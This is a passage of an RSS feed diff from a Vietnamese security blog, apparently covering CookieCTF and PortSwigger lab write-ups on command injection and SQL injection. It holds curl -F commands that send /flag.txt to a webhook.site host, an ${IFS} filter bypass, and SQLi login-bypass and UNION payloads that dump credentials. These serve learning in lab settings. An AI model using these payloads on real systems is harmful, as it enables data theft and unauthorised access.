+<p>Tới đây ta để ý <code>blacklist</code> không lọc lệnh <code>curl</code> nên ta có thể gửi file <code>flag</code> qua host khác để đọc bằng option <code>-F</code>.
+Ở đây mình sử dụng <code>webhook.site</code> để làm host nhận file.</p>
+<p>Payload: <code>curl -F @/flag.txt https://webhook.site/407cb1c3-4316-4cb8-8b9c-4ece7abf8d11</code></p>
+<p>Nhưng vẫn còn hàm <code>translate()</code> loại bỏ khoảng trắng của <code>input</code>. Search gg một lúc thì mình tìm được cái này:</p>
+<p></p>
+<p>Có thể sử dụng <code>${IFS}</code> để thay thế các ký tự <code>&lt;space&gt;</code> <code>&lt;tab&gt;</code> <code>&lt;newline&gt;</code>.</p>
+<p>Payload: <code>$(curl${IFS}-F${IFS}file=@/flag.txt${IFS}https://webhook.site/407cb1c3-4316-4cb8-8b9c-4ece7abf8d11)</code></p>
+<p></p>
+<p>Tải file <code>flag.txt</code>về ta được flag:
+<code>CHH{os_c0mManD_INj3cTi0N_bypa5S_FIL7Er_b1f4b3371b6a365f47334d3ec07a8d0e}</code></p>
+]]></description>
+</item>
+<item>
+    <title>PortSwigger - SQL Injection</title>
+    <link>https://g03m0n.github.io/posts/portswigger---sqli/portswigger---sqli/</link>
+    <pubDate>Sat, 20 Jan 2024 08:29:01 &#43;0800</pubDate>
+    <author>g03m0n</author>
+    <guid>https://g03m0n.github.io/posts/portswigger---sqli/portswigger---sqli/</guid>
+    <description><![CDATA[<h2 id="1-sql-injection-vulnerability-in-where-clause-allowing-retrieval-of-hidden-data">1. SQL injection vulnerability in WHERE clause allowing retrieval of hidden data</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<p>Level: APPRENTICE</p>
+<h3 id="description">Description</h3>
+<p>Lab này chứa lỗ hổng SQLi trong bộ lọc danh mục sản phẩm. Khi người dùng chọn một danh mục, ứng dụng sẽ thực hiện truy vấn SQL như sau:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">products</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">category</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Gifts&#39;</span> <span style="color:#66d9ef">AND</span> <span style="color:#a6e22e">released</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>Để giải quyết bài lab, khiến ứng dụng hiển thị một hoặc nhiều sản phẩm chưa được phát hành.</p>
+<h3 id="step">Step</h3>
+<p>Đầu tiên click vào một category bất kỳ
+Sau khi nhấp vào <code>Accessories</code> category, URL hiển thị:</p>
+<pre tabindex="0"><code>https://0a8000e303dd05e481ca2ff0002600bb.web-security-academy.net/filter?category=Accessories
+</code></pre><p>Để ý những từ in đậm là chuỗi truy vấn.
+Ứng dụng sẽ thực hiện một truy vấn SQL để lấy thông tin từ cơ sở dữ liệu.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">products</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">category</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Accessories&#39;</span> <span style="color:#66d9ef">AND</span> <span style="color:#a6e22e">released</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>Mục tiêu là lấy tất cả thông tin sản phẩm, từ tất cả danh mục và cả sản phẩm đã phát hành và chưa phát hành.
+Câu lệnh trên hiển thị <code>released = 1</code> nghĩa là nó sẽ chỉ hiển thị các sản phẩm đã được phát hành, trong đó <code>released = 0</code> đại diện cho các sản phẩm chưa được phát hành.</p>
+<p></p>
+<p>Tiếp theo nếu thêm một dấu <code>'</code> vào cuối chuỗi truy vấn</p>
+<p><code>?category=Accessories'</code></p>
+<p>Câu truy vấn sẽ là</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">products</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">category</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Accessories&#39;</span><span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#66d9ef">AND</span> <span style="color:#a6e22e">released</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>Điều này sẽ gây ra lỗi vì có một dấu <code>'</code> chưa được đóng.</p>
+<p></p>
+<p>Tiếp theo, thêm 2 dấu gạch ngang:</p>
+<p><code>?category=Accessories' --</code></p>
+<p>Câu truy vấn sẽ là</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">products</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">category</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Accessories&#39;</span> <span style="color:#f92672">--</span><span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#66d9ef">AND</span> <span style="color:#a6e22e">released</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>Trong MySQL, mọi thứ sau dấu <code>--</code> sẽ được coi là <code>comment</code>.
+Có nghĩa là bây giờ trang web sẽ hiển thị tất cả các sản phẩm thuộc danh mục <code>Accessories</code>, cả <code>released</code> và <code>unreleased</code>.</p>
+<p></p>
+<p>Để hiển thị đầy đủ mọi thứ trong cơ sở dữ liệu:</p>
+<p><code>?category=Acesssories' or '1'='1' --'</code></p>
+<p>Chuỗi truy vấn lúc này sẽ là:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">products</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">category</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Accessories&#39;</span> <span style="color:#66d9ef">or</span> <span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;1&#39;</span><span style="color:#f92672">--</span><span style="color:#960050;background-color:#1e0010">&#39;</span> <span style="color:#66d9ef">AND</span> <span style="color:#a6e22e">released</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><p>Với truy vấn trên, nó sẽ trả về tất cả các sản phẩm khi <code>Category</code> là <code>Accessories</code> hoặc <code>1 = 1</code> , vì <code>1 = 1</code> luôn đúng nên nó sẽ trả về tất cả các sản phẩm.</p>
+<p></p>
+<p>Solved</p>
+<p></p>
+<h2 id="2-sql-injection-vulnerability-allowing-login-bypass">2. SQL injection vulnerability allowing login bypass</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/lab-login-bypass" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<p>Level: APPRENTICE</p>
+<h3 id="description-1">Description</h3>
+<p>Lab này chứa lỗ hổng SQL Injection trong chức năng đăng nhập.</p>
+<p>Để giải quyết bài lab, thực hiện một cuộc tấn công SQLi để đăng nhập vào ứng dụng với tư cách là <code>administrator</code>.</p>
+<h3 id="step-1">Step</h3>
+<p>Đầu tiên ấn vào <code>My account</code> để vào giao diện <code>login</code>
+Thử đăng nhập với tài khoản <code>administrator</code> và mật khẩu bất kỳ.</p>
+<p></p>
+<p>Khi đăng nhập, câu truy vấn sẽ có dạng:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">users</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;administrator&#39;</span> <span style="color:#66d9ef">AND</span> <span style="color:#a6e22e">password</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;password&#39;</span>
+</span></span></code></pre></div><p>Tiếp theo ta thử thêm 1 dấu <code>'</code> vào cuối <code>administrator</code> và đăng nhập.</p>
+<p></p>
+<p>Server sẽ bị lỗi, điều này cho thấy server bị lỗi SQL Injection.
+Nếu ta tiêm vào <code>username</code> câu lệnh: <code>administrator' or '1' = '1' --</code>
+Câu truy vấn sẽ có dạng:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">users</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">username</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;administrator&#39;</span> <span style="color:#66d9ef">or</span> <span style="color:#e6db74">&#39;1&#39;</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;1&#39;</span> <span style="color:#f92672">--</span><span style="color:#e6db74">&#39; AND password = &#39;</span><span style="color:#a6e22e">password</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
+</span></span></code></pre></div><p>Bất kể mật khảu của tài khoản <code>administrator</code> có đúng hay không, vì <code>1 = 1</code> sẽ luôn trả về <code>true</code> và dấu <code>--</code> sẽ <code>comment</code> phần còn lại của câu lệnh <code>' AND password = 'password'</code> nên nó sẽ đăng nhập vào tài khoản <code>administrator</code>.</p>
+<p></p>
+<p>Đăng nhập thành công.
+Solved</p>
+<p></p>
+<h2 id="3-sql-injection-attack-querying-the-database-type-and-version-on-oracle">3. SQL injection attack, querying the database type and version on Oracle</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<p>Level: PRACTITIONER</p>
+<h3 id="description-2">Description</h3>
+<p>Lab này chứa lỗ hổng SQL Injection trong filter danh mục sản phẩm. Sử dụng UNION Attack để truy xuất kết quả từ truy vấn được chèn.
+Để giải bài lab, hãy hiển thị phiên bản của cơ sở dữ liệu.</p>
+<h3 id="step-2">Step</h3>
+<p>Trong Oracle, built-in table có tên là <code>dual</code>, do vậy, ta có thể dò cột bằng cách sử dụng <code>UNION SELECT</code> và gọi <code>FROM</code> đến bảng <code>dual</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">products</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">category</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Accessories&#39;</span> <span style="color:#a6e22e">UNION</span> <span style="color:#a6e22e">SELECT</span> <span style="color:#66d9ef">null</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">dual</span> <span style="color:#f92672">--</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
+</span></span></code></pre></div><p>Lặp đi lặp lại câu lệnh, mỗi lần tăng số lượng <code>null</code>.
+Ta có thể tìm thấy số lượng cột chính xác bằng cách thêm <code>' UNION (select null, null)--</code>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">someTable</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">category</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Accessories&#39;</span> <span style="color:#a6e22e">UNION</span> (<span style="color:#a6e22e">SELECT</span> <span style="color:#66d9ef">null</span>, <span style="color:#66d9ef">null</span>) <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">dual</span> <span style="color:#f92672">--</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
+</span></span></code></pre></div><p></p>
+<p>Đến đây, ta có thể biết được <code>version</code> của database bằng payload: <code>' UNION SELECT NULL,banner FROM v$version --'</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">SELECT</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">products</span> <span style="color:#a6e22e">WHERE</span> <span style="color:#a6e22e">category</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;Accessories&#39;</span> <span style="color:#a6e22e">UNION</span> <span style="color:#a6e22e">SELECT</span> <span style="color:#66d9ef">NULL</span>,<span style="color:#a6e22e">banner</span> <span style="color:#a6e22e">FROM</span> <span style="color:#a6e22e">v</span>$version <span style="color:#f92672">--</span><span style="color:#960050;background-color:#1e0010">&#39;</span>
+</span></span></code></pre></div><p></p>
+<p>Solved</p>
+<p></p>
+<h2 id="4-sql-injection-attack-querying-the-database-type-and-version-on-mysql-and-microsoft">4. SQL injection attack, querying the database type and version on MySQL and Microsoft</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<p>Level: PRACTITIONER</p>
+<h3 id="description-3">Description</h3>
+<p>Lab này chứa lỗ hổng SQL Injection trong filter danh mục sản phẩm. Sử dụng UNION Attack để truy xuất kết quả từ truy vấn được chèn.
+Để giải bài lab, hãy hiển thị phiên bản của cơ sở dữ liệu.</p>
+<h3 id="step-3">Step</h3>
+<p>Lab này tương tự như lab về <a href="#3-sql-injection-attack-querying-the-database-type-and-version-on-oracle" rel="">Oracle Datable</a>
+ nhưng sử dụng MySQL Database.
+Đầu tiên ta cũng dự đoán số cột tương tự <a href="#step-2" rel="">lab 3</a>
+ .
+Database lần này cũng gồm 2 cột sau khi thử: <code>Accessories' UNION SELECT NULL,NULL --'</code></p>
+<p></p>
+<p>Đến đây, ta có thể biết được <code>version</code> của database bằng payload: <code>' UNION SELECT NULL,@@version --'</code></p>
+<p></p>
+<p>Solved</p>
+<p></p>
+<h2 id="5-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases">5. SQL injection attack, listing the database contents on non-Oracle databases</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<p>Level: PRACTITIONER</p>
+<h3 id="description-4">Description</h3>
+<p>Lab này yêu cầu ta tìm kiếm account của administrator để login. Tuy vậy, ta chưa biết database loại nào mà chỉ biết nó không phải là Oracle mà thôi.</p>
+<h3 id="step-4">Step</h3>
+<p>Đầu tiên, ta sẽ dò số cột trong database:</p>
+<p></p>
+<p>Như vậy ta đã biết trong database có 2 cột.
+Thử một số cách kiểm tra <code>version</code> của database ta có thể biết được server dụng <code>PostgreSQL</code>.</p>
+<p>
+</p>
+<p>Ta sử dụng payload này để kiểm tra tên bảng có trong database: <code>' UNION SELECT NULL, table_name FROM information_schema.tables --'</code></p>
+<p></p>
+<p>Có 2 bảng là <code>pg_user</code> và <code>users_excods</code>
+Kiểm tra lần lượt các cột trong 2 bảng này thì phát hiện ra trong bảng <code>user_excods</code> có 2 cột khả nghi.</p>
+<p>Payload: <code>' UNION SELECT null,column_name FROM information_schema.columns WHERE table_name='users_excods' --'</code></p>
+<p></p>
+<p>Kiểm tra 2 cột, ta biết được tài khoản/mật khẩu của <code>administrator</code>.</p>
+<p>Payload: <code>' UNION SELECT username_tjzvcx, password_ligkez FROM users_excods --'</code></p>
+<p></p>
+<p>Solved</p>
+<p></p>
+<h2 id="6-sql-injection-attack-listing-the-database-contents-on-oracle">6. SQL injection attack, listing the database contents on Oracle</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<p>Level: PRACTITIONER</p>
+<h3 id="description-5">Description</h3>
+<p>Lab này yêu cầu ta tìm kiếm account của administrator để login. Sử dụng Oracle Database.</p>
+<h3 id="step-5">Step</h3>
+<p>Giống với <a href="#5-sql-injection-attack-listing-the-database-contents-on-non-oracle-databases" rel="">lab 5</a>
+ ở trên nên mình sẽ làm tương tự.</p>
+<p>Payload: <code>' UNION SELECT NULL, table_name from all_tables --'</code></p>
+<p></p>
+<p></p>
+<p>Tìm được bảng có tên <code>USERS_JBIWMO</code>.
+Tiếp tục tìm kiếm các cột có trong bảng <code>USERS_JBIWMO</code></p>
+<p></p>
+<p>Ta tìm được tài khoản/mật khẩu của <code>administrator</code> với payload:</p>
+<p>Payload: <code>' UNION SELECT USERNAME_EYKUIK, PASSWORD_ISAXTU FROM USERS_JBIWMO --'</code>
+</p>
+<p>Solved</p>
+<p></p>
+<h2 id="7-sql-injection-union-attack-determining-the-number-of-columns-returned-by-the-query">7. SQL injection UNION attack, determining the number of columns returned by the query</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<p>Level: PRACTITIONER</p>
+<h3 id="description-6">Description</h3>
+<p>Bài lab yêu cầu ta xác định số cột của bảng bằng cách sử dụng SQL injection UNION attack.</p>
+<h3 id="step-6">Step</h3>
+<p>Tương tự cách xác định cột tại <a href="#step-3" rel="">đây</a>
+.</p>
+<p>Payload: <code>' UNION SELECT NULL, NULL, NULL --'</code></p>
+<p></p>
+<p>Solved</p>
+<p></p>
+<h2 id="8-sql-injection-union-attack-finding-a-column-containing-text">8. SQL injection UNION attack, finding a column containing text</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<p>Level: PRACTITIONER</p>
+<h3 id="description-7">Description</h3>
+<p>Bài lab yêu cầu ta tìm chuỗi dữ liệu cho trước <code>64fl9W</code> bằng cách sử dụng SQL injection UNION attack.</p>
+<h3 id="step-7">Step</h3>
+<p>Đầu tiên ta cũng <a href="#step-3" rel="">xác định số cột của bảng</a>
+.</p>
+<p>Payload: <code>' UNION SELECT NULL, NULL, NULL --'</code></p>
+<p></p>
+<p>Với UNION Attack, ta có thể tìm một cột chưa giá trị loại <code>string</code> bằng cách thử chèn đoạn <code>string</code> cần tìm vào:</p>
+<p>Payload: <code>' UNION SELECT NULL, '64fl9W' ,NULL --'</code></p>
+<p></p>
+<p>Solved</p>
+<p></p>
+<h2 id="9-sql-injection-union-attack-retrieving-data-from-other-tables">9. SQL injection UNION attack, retrieving data from other tables</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/lab-login-bypass" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<p>Level: PRACTITIONER</p>
+<h3 id="description-8">Description</h3>
+<h3 id="step-8">Step</h3>
+<h2 id="10-sql-injection-union-attack-retrieving-multiple-values-in-a-single-column">10. SQL injection UNION attack, retrieving multiple values in a single column</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/lab-login-bypass" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<p>Level: APPRENTICE</p>
+<h3 id="description-9">Description</h3>
+<h3 id="step-9">Step</h3>
+<h2 id="11-blind-sql-injection-with-conditional-responses">11. Blind SQL injection with conditional responses</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/lab-login-bypass" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<p>Level: PRACTITIONER</p>
+<h3 id="description-10">Description</h3>
+<h3 id="step-10">Step</h3>
+<h2 id="12-blind-sql-injection-with-conditional-errors">12. Blind SQL injection with conditional errors</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/lab-login-bypass" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<p>Level: PRACTITIONER</p>
+<h3 id="description-11">Description</h3>
+<h3 id="step-11">Step</h3>
+<h2 id="13">13.</h2>
+<p>Link lab tại <a href="https://portswigger.net/web-security/sql-injection/lab-login-bypass" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<p>Level: PRACTITIONER</p>
+<h3 id="description-12">Description</h3>
+<h3 id="step-12">Step</h3>
+]]></description>
+</item>
+<item>
+    <title>CookieCTF - Baby Crawler</title>
+    <link>https://g03m0n.github.io/posts/cookiectf---baby-crawler/</link>
+    <pubDate>Fri, 19 Jan 2024 21:29:01 &#43;0800</pubDate>
+    <author>g03m0n</author>
+    <guid>https://g03m0n.github.io/posts/cookiectf---baby-crawler/</guid>
+    <description><![CDATA[<h2 id="description">Description</h2>
+<p>Link challenge tại <a href="https://battle.cookiearena.org/challenges/web/baby-crawler" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<h2 id="step">Step</h2>
+<p>Đây là giao diện chính của challenge:</p>
+<p></p>
+<p>Ở challenge này, khi ấn vào nút <code>CRAWL</code> trang web sẽ hiển thị một đường link <code>Cached File</code></p>
+<p></p>
+<p>Khi click vào đường link ta sẽ thấy <code>html</code> của trang web</p>
+<p></p>
+<p>Quay trở lại giao diện chính, kiểm tra source code thì phát hiện 1 endpoint <code>?debug</code></p>
+<p></p>
+<p>Kiểm tra thì thấy được đoạn code chạy ở server-side. Chú ý vào đoạn code này:</p>
+<p></p>
+<p>Đoạn code sẽ kiểm tra url người dung nhập vào có sử dụng HTTP/HTTPS hay không, nếu có website sẽ <code>crawl</code> web bằng lệnh <code>curl</code>, sau đó lưu nội dung <code>crawl</code> được vào một file nằm trong thư mục <code>./cache</code>.
+Vì có hàm <code>shell_exec</code> nên đây có thể là một lỗi Command Injection. Ở đây hàm <code>escapeshellcmd</code> được dùng để chặn các ký tự  <code>&amp;#;``|*?~&lt;&gt;^()[]{}$\</code>, <code>\x0A</code> và <code>\xFF</code> từ <code>url</code> người dùng nhập vào.</p>
+<p></p>
+<p>Vì vậy ta không thể bypass được challenge này theo hướng sử dụng các ký tự <code>;</code> hay <code>&amp;</code>, bắt buộc phải đi theo một hướng khác.
+Thay vì <code>inject</code> một câu lệnh để server thực hiện sau khi đã thực hiện lệnh <code>curl</code>, ta có thể tận dụng trực tiếp câu lệnh <code>curl</code> để gửi nội dung của file tới một server do ta tự dựng lên với option <code>-F</code>.</p>
+<p>Mình sẽ sử dụng <a href="https://webhook.site" target="_blank" rel="noopener noreffer">webhook.site</a>
+ để làm server nhận file gửi đến.</p>
+<p></p>
+<p>Payload:
+<code>http://18.142.90.137:31315/ -F file=@/flag.txt https://webhook.site/407cb1c3-4316-4cb8-8b9c-4ece7abf8d11</code></p>
+<p></p>
+<p>Tải file <code>flag.txt</code> về ta được flag: <code>CHH{b48Y_CUrl_CrAwl3r_1c7ddee4c53dfc5fc952c63ca0aebb9a}</code></p>
+]]></description>
+</item>
+<item>
+    <title>CookieCTF - Baby SQLite With Filter</title>
+    <link>https://g03m0n.github.io/posts/cookiectf---baby-sqlite-with-filter/cookiectf-babysqlitewithfilter/</link>
+    <pubDate>Fri, 19 Jan 2024 21:29:01 &#43;0800</pubDate>
+    <author>g03m0n</author>
+    <guid>https://g03m0n.github.io/posts/cookiectf---baby-sqlite-with-filter/cookiectf-babysqlitewithfilter/</guid>
+    <description><![CDATA[<h2 id="description">Description</h2>
+<p>Link challenge tại <a href="https://battle.cookiearena.org/challenges/web/baby-sqlite-with-filter" target="_blank" rel="noopener noreffer">đây</a>
+</p>
+<blockquote>
+<p>You cannot create the query because we have blocked the following keywords. Challenge you to bypass it, how to know after each SQL Keyword you will be used what SQL statement. The blacklist sqli_filter = &lsquo;[&rsquo;, &lsquo;]&rsquo;, &lsquo;,&rsquo;, &lsquo;admin&rsquo;, &lsquo;select&rsquo;, &lsquo;&rsquo;&rsquo;, &lsquo;&quot;&rsquo;, &lsquo;\t&rsquo;, &lsquo;\n&rsquo;, &lsquo;\r&rsquo;, &lsquo;\x08&rsquo;, &lsquo;\x09&rsquo;, &lsquo;\x00&rsquo;, &lsquo;\x0b&rsquo;, &lsquo;\x0d&rsquo;, &rsquo; &lsquo;.
+<strong>The vulnerable parameter is &rsquo;level&rsquo; in Login function.</strong></p>
+</blockquote>
+<h2 id="step">Step</h2>
+<p>Đây là giao diện chính của challenge:</p>
+<p></p>
+<p>Tiến hành đọc source code:</p>
+<pre tabindex="0"><code>#!/usr/bin/env python3
+from flask import Flask, request, render_template, make_response, redirect, url_for, session, g
+import urllib
+import os
+import sqlite3
+
+app = Flask(__name__)
+app.secret_key = os.urandom(32)
+from flask import _app_ctx_stack
+
+DATABASE = &#39;users.db&#39;
+
+def get_db():
+    top = _app_ctx_stack.top
+    if not hasattr(top, &#39;sqlite_db&#39;):
+        top.sqlite_db = sqlite3.connect(DATABASE)
+    return top.sqlite_db
+
+
+FLAG = open(&#39;/flag.txt&#39;, &#39;r&#39;).read()
+
+
+@app.route(&#39;/&#39;)
+def index():
+    return render_template(&#39;index.jinja2&#39;)
+
+
+@app.route(&#39;/login&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
+def login():
+    if request.method == &#39;GET&#39;:
+        return render_template(&#39;login.jinja2&#39;)
+
+    uid = request.form.get(&#39;uid&#39;, &#39;&#39;).lower()
+    upw = request.form.get(&#39;upw&#39;, &#39;&#39;).lower()
+    level = request.form.get(&#39;level&#39;, &#39;9&#39;).lower()
+
+    sqli_filter = [&#39;[&#39;, &#39;]&#39;, &#39;,&#39;, &#39;admin&#39;, &#39;select&#39;, &#39;\&#39;&#39;, &#39;&#34;&#39;, &#39;\t&#39;, &#39;\n&#39;, &#39;\r&#39;, &#39;\x08&#39;, &#39;\x09&#39;, &#39;\x00&#39;, &#39;\x0b&#39;, &#39;\x0d&#39;, &#39; &#39;]
+    for x in sqli_filter:
+        if uid.find(x) != -1:
+            return &#39;No Hack!&#39;
+        if upw.find(x) != -1:
+            return &#39;No Hack!&#39;
+        if level.find(x) != -1:
+            return &#39;No Hack!&#39;
+
+   
+    with app.app_context():
+        conn = get_db()
+        query = f&#34;SELECT uid FROM users WHERE uid=&#39;{uid}&#39; and upw=&#39;{upw}&#39; and level={level};&#34;
+        try:
+            req = conn.execute(query)
+            result = req.fetchone()
+
+            if result is not None:
+                uid = result[0]
+                if uid == &#39;admin&#39;:
+                    return FLAG
+        except Exception as e:
+            print(e)
+            return &#39;Error!&#39;
+    return &#39;Good!&#39;
+
+
+@app.teardown_appcontext
+def close_connection(exception):
+    top = _app_ctx_stack.top
+    if hasattr(top, &#39;sqlite_db&#39;):
+        top.sqlite_db.close()
+
+
+if __name__ == &#39;__main__&#39;:
+    os.system(&#39;rm -rf %s&#39; % DATABASE)
+    with app.app_context():
+        conn = get_db()
+        conn.execute(&#39;CREATE TABLE users (uid text, upw text, level integer);&#39;)
+        conn.execute(&#34;INSERT INTO users VALUES (&#39;dream&#39;,&#39;cometrue&#39;, 9);&#34;)
+        conn.commit()
+
+    app.run(host=&#39;0.0.0.0&#39;, port=1337)
+</code></pre><p>Có thể thấy được rằng để lấy được flag thì <code>uid</code> phải là <code>admin</code> nhưng ở trong database lại không có user nào là <code>admin</code>.
+Vì vậy ta phải khiến cho chương trình hiện thị ra mỗi một cái bảng với cột uid = <code>admin</code>.</p>
+<p>Thử nghiệm ở trên <a href="https://sqliteonline.com/" target="_blank" rel="noopener noreffer">SQLite Online</a>
+ với câu lệnh như sau:</p>
+<pre tabindex="0"><code>SELECT uid FROM users WHERE uid=&#39;dream&#39; AND upw= &#39;cometrue&#39; AND level=&#39;9&#39; UNION SELECT &#39;admin&#39; AS uid;
+</code></pre><p></p>
+<p>Nhưng ta đã bị filter khá là nhiều ký tự, trong đó có cả <code>SELECT</code> và <code>admin</code>.</p>
+<p>Trong SQLite, theo <a href="http://www.humane-assessment.com/blog/moose-custom-analyses-made-easy/#:~:text=For%20example%2C%20to%20build%20a%20parser%20for%20SQLite%2C%20you%20can%20follow%20the%20official%20abstract%20grammar.%20In%20this%20grammar%2C%20the%20selectCore%20is%20one%20of%20the%20central%20productions%20and%20the%20specification%20looks%20like%3A" target="_blank" rel="noopener noreffer">selectCore</a>
+ ngoài kết hợp toán tử <code>UNION</code> với toán tử <code>SELECT</code> ta còn có thể kết hợp với toán tử <code>VALUES</code>.</p>
+<p></p>
+<p>Thử nghiệm:</p>
